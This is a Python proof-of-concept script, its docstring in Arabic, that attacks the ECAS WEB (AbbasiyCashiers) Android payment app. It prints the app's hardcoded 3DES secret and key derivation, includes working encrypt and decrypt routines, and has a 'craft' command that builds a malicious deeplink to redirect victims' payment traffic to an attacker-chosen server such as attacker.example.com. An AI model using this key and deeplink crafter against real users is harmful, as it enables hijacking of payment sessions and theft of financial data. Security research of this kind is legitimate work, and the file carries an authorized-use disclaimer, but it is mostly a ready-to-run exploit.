#!/usr/bin/env python3
"""
ECAS WEB v18.4 — Proof-of-Concept (PoC) Decryption Tool
========================================================
الغرض: إثبات استغلال ثغرة المفتاح المُضَمَّن (Hardcoded Key) في تطبيق
       AbbasiyCashiers (com.egy.webpaymentapp).

الاستخدام: بحث أمني/تدقيق فقط. لا تستخدم ضد أنظمة لا تملكها أو لا تملك
          إذن صريح بفحصها.

الخوارزمية المُكتشفة (في MediaSessionCompat.r() / MediaSessionCompat.s()):
    HARDCODED_SECRET = "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"
    md5      = MD5(HARDCODED_SECRET)            # 16 bytes
    key24    = md5 + md5[0:8]                   # 24 bytes (3DES key)
    cipher   = DESede / ECB / NoPadding (default in Java when not specified)
    encode   = Base64(ciphertext)

استخدامها في التطبيق:
    LoginActivity.A() → MediaSessionCompat.r( s( deeplink_ip ) )

المتطلبات:
    pip install pycryptodome
"""

import hashlib
import base64
import sys
from Crypto.Cipher import DES3

HARDCODED_SECRET = b"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"


def derive_key() -> bytes:
    """Replicates ECAS WEB key derivation: MD5 then extend to 24 bytes."""
    md5 = hashlib.md5(HARDCODED_SECRET).digest()  # 16 bytes
    return md5 + md5[:8]  # 24 bytes for 3DES


def pkcs5_pad(data: bytes, block_size: int = 8) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)


def pkcs5_unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 8:
        return data  # Probably no padding
    return data[:-pad_len]


def encrypt(plaintext: str) -> str:
    """Encrypts a plaintext string and returns Base64-encoded ciphertext."""
    cipher = DES3.new(derive_key(), DES3.MODE_ECB)
    ct = cipher.encrypt(pkcs5_pad(plaintext.encode("utf-8")))
    return base64.b64encode(ct).decode("ascii")


def decrypt(b64_ciphertext: str) -> str:
    """Decrypts a Base64-encoded ciphertext back to plaintext."""
    cipher = DES3.new(derive_key(), DES3.MODE_ECB)
    raw = base64.b64decode(b64_ciphertext)
    pt = cipher.decrypt(raw)
    pt = pkcs5_unpad(pt)
    return pt.decode("utf-8", errors="replace")


def craft_malicious_deeplink(evil_server: str) -> str:
    """Generates an exploitation deeplink that hijacks the app's server URL."""
    encrypted = encrypt(evil_server)
    # URL-safe encoding for query parameter
    from urllib.parse import quote
    return f"https://ecas.web.link/?ip={quote(encrypted)}"


def banner():
    print("=" * 68)
    print(" ECAS WEB v18.4 — Decryption / Exploitation PoC")
    print(" For authorized security research only")
    print("=" * 68)
    print(f" Derived 3DES key (hex): {derive_key().hex()}")
    print("=" * 68)


def usage():
    print("Usage:")
    print(f"  {sys.argv[0]} encrypt <plaintext>")
    print(f"  {sys.argv[0]} decrypt <base64_ciphertext>")
    print(f"  {sys.argv[0]} craft   <evil_server:port/path>")
    print(f"  {sys.argv[0]} test")
    print()
    print("Examples:")
    print(f"  {sys.argv[0]} encrypt 192.168.1.100:8057/payment")
    print(f"  {sys.argv[0]} craft   attacker.example.com:8057/payment")


def self_test():
    """Round-trip test to verify the implementation."""
    print("[*] Running self-test...")
    test_cases = [
        "192.168.1.100:8057/payment",
        "https://attacker.example.com:8057/payment",
        "evil.evil.com",
        "abbasiy.yedns.org:8057/payment",  # Default server
    ]
    for tc in test_cases:
        ct = encrypt(tc)
        pt = decrypt(ct)
        status = "✓" if pt == tc else "✗"
        print(f"  [{status}] '{tc}'")
        print(f"       enc → {ct}")
        print(f"       dec → '{pt}'")
    print("[+] Self-test complete.")


if __name__ == "__main__":
    banner()
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)

    cmd = sys.argv[1].lower()

    if cmd == "test":
        self_test()
    elif cmd == "encrypt" and len(sys.argv) == 3:
        print(f"Plaintext:  {sys.argv[2]}")
        print(f"Ciphertext: {encrypt(sys.argv[2])}")
    elif cmd == "decrypt" and len(sys.argv) == 3:
        print(f"Ciphertext: {sys.argv[2]}")
        print(f"Plaintext:  {decrypt(sys.argv[2])}")
    elif cmd == "craft" and len(sys.argv) == 3:
        print(f"[*] Crafting hijacking deeplink for: {sys.argv[2]}")
        url = craft_malicious_deeplink(sys.argv[2])
        print(f"[+] Malicious URL:")
        print(f"    {url}")
        print()
        print("    When a victim with ECAS WEB installed taps this link,")
        print("    the app will replace its API server with the attacker's.")
    else:
        usage()
        sys.exit(1)
